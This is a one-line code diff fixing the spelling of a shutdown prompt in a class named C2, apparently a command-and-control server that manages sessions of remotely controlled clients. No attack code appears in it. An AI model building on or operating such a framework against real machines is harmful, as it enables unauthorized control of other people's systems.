@@ -355,7 +355,7 @@ class C2():
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
         globals()['post_handler'].terminate()
-        if self._get_prompt('Quiting Server - Keep clients alive? (y/n): ').startswith('y'):
+        if self._get_prompt('Quitting server - Keep clients alive? (y/n): ').startswith('y'):
             for session in self.sessions.values():
                 if isinstance(session, Session):
                     try:
